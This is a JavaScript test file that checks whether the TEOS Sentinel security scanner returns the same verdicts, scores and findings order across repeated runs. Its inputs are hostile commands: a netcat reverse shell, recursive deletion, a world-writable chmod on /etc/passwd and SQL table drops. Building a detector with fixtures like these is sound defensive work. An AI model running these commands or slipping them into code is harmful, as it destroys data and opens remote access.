// TEOS Sentinel — Determinism Regression Suite
// Verifies: same input × 1000 → identical score, verdict, findings, execution order
// Run: node test/determinism-test.js
// CI must fail if any determinism check fails.

const assert = require('assert');
const { executeEngine } = require('../src/engines/index');

let passed = 0;
let failed = 0;
const ITERATIONS = 1000;

function test(name, fn) {
  try { fn(); passed++; console.log(`  ✅ ${name}`); }
  catch (e) { failed++; console.error(`  ❌ ${name}: ${e.message}`); }
}

console.log('\n═══════════════════════════════════════════');
console.log('  TEOS Sentinel — Determinism Test Suite');
console.log(`  Iterations per test: ${ITERATIONS}`);
console.log('═══════════════════════════════════════════\n');

// ── Test 1: ALLOW consistency ──
console.log('\n📋 Test 1: ALLOW verdict — same input × 1000');
test('ALLOW: identical output across iterations', () => {
  const input = 'echo hello world';
  const first = executeEngine('core', input);
  for (let i = 0; i < ITERATIONS; i++) {
    const result = executeEngine('core', input);
    assert.deepStrictEqual(result.verdict, first.verdict, 'verdict mismatch');
    assert.deepStrictEqual(result.score, first.score, 'score mismatch');
    assert.deepStrictEqual(result.findings.length, first.findings.length, 'findings count mismatch');
  }
});

// ── Test 2: BLOCK consistency ──
console.log('\n📋 Test 2: BLOCK verdict — same input × 1000');
test('BLOCK: identical output across iterations', () => {
  const input = 'DROP TABLE users; DROP DATABASE production';
  const first = executeEngine('core', input);
  for (let i = 0; i < ITERATIONS; i++) {
    const result = executeEngine('core', input);
    assert.deepStrictEqual(result.verdict, first.verdict, 'verdict mismatch');
    assert.deepStrictEqual(result.score, first.score, 'score mismatch');
    assert.deepStrictEqual(result.findings.length, first.findings.length, 'findings count mismatch');
    assert.deepStrictEqual(result.highestRule, first.highestRule, 'highestRule mismatch');
    assert.deepStrictEqual(result.highestRuleScore, first.highestRuleScore, 'highestRuleScore mismatch');
  }
});

// ── Test 3: WARN consistency ──
console.log('\n📋 Test 3: WARN verdict — same input × 1000');
test('WARN: identical output across iterations', () => {
  const input = 'console.log(trust_user_input)';
  const first = executeEngine('core', input);
  for (let i = 0; i < ITERATIONS; i++) {
    const result = executeEngine('core', input);
    assert.deepStrictEqual(result.verdict, first.verdict, 'verdict mismatch');
    assert.deepStrictEqual(result.score, first.score, 'score mismatch');
    assert.deepStrictEqual(result.findings.length, first.findings.length, 'findings count mismatch');
  }
});

// ── Test 4: Engine version consistency ──
console.log('\n📋 Test 4: Engine version — same across all iterations');
test('VERSION: identical version fields', () => {
  const input = 'test input';
  const first = executeEngine('core', input);
  for (let i = 0; i < ITERATIONS; i++) {
    const result = executeEngine('core', input);
    assert.deepStrictEqual(result.engineVersion, first.engineVersion, 'engineVersion mismatch');
    assert.deepStrictEqual(result.rulePackVersion, first.rulePackVersion, 'rulePackVersion mismatch');
    assert.deepStrictEqual(result.policyVersion, first.policyVersion, 'policyVersion mismatch');
  }
});

// ── Test 5: Findings order consistency ──
console.log('\n📋 Test 5: Finding order — same execution order across iterations');
test('ORDER: identical findings array order', () => {
  const input = 'rm -rf /var/log; nc -e /bin/bash 10.0.0.1 4444; DROP TABLE users';
  const first = executeEngine('core', input);
  for (let i = 0; i < ITERATIONS; i++) {
    const result = executeEngine('core', input);
    assert.deepStrictEqual(
      result.findings.map(f => f.ruleId),
      first.findings.map(f => f.ruleId),
      'findings order or contents changed'
    );
  }
});

// ── Test 6: Cross-engine determinism ──
console.log('\n📋 Test 6: Cross-engine determinism');
const ENGINES = ['core', 'banking', 'solana', 'evm', 'dependency', 'ci', 'tokenIntel', 'dueDiligence'];
for (const eng of ENGINES) {
  test(`${eng}: determinism over ${ITERATIONS}`, () => {
    const input = eng === 'dependency'
      ? '{"dependencies":{"lodash":"4.17.19","axios":"1.7.3"}}'
      : 'DROP TABLE users; sudo bash -c id; chmod 777 /etc/passwd';
    const first = executeEngine(eng, input);
    for (let i = 0; i < 100; i++) { // 100× for cross-engine to keep total runtime reasonable
      const result = executeEngine(eng, input);
      assert.deepStrictEqual(result.verdict, first.verdict, `verdict mismatch at iter ${i}`);
      assert.deepStrictEqual(result.score, first.score, `score mismatch at iter ${i}`);
      assert.deepStrictEqual(result.findings.length, first.findings.length, `findings count mismatch at iter ${i}`);
    }
  });
}

// ── Test 7: ERROR consistency ──
console.log('\n📋 Test 7: ERROR handling — same input × 1000');
test('ERROR: identical output for invalid input', () => {
  const input = '';
  const first = executeEngine('core', input);
  for (let i = 0; i < ITERATIONS; i++) {
    const result = executeEngine('core', input);
    assert.deepStrictEqual(result.verdict, first.verdict, 'verdict mismatch');
    assert.deepStrictEqual(result.score, first.score, 'score mismatch');
  }
});

// ── Test 8: Version metadata on ERROR ──
console.log('\n📋 Test 8: Version metadata on all response types');
test('VERSION on ERROR: unknown engine', () => {
  const result = executeEngine('nonexistent', 'test');
  if (!result.engineVersion) throw new Error('Missing engineVersion on error');
  if (!result.rulePackVersion) throw new Error('Missing rulePackVersion on error');
  if (!result.policyVersion) throw new Error('Missing policyVersion on error');
});

// ── Summary ──
console.log(`\n═══════════════════════════════════════════`);
console.log(`  Total: ${passed + failed}`);
console.log(`  ${passed} passed, ${failed} failed`);
console.log(`═══════════════════════════════════════════\n`);

process.exit(failed > 0 ? 1 : 0);
